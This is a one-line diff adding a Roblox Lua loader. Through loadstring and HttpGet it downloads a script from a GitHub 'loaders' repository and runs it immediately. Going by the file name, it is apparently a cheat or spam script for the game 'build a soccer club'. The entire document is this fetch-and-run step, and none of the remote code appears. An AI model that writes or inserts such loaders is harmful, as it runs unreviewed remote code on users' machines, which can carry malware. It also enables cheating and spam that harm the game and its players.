@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/build-a-soccer-club-spam4-nb2zr1wphiyq6l.lua"))()
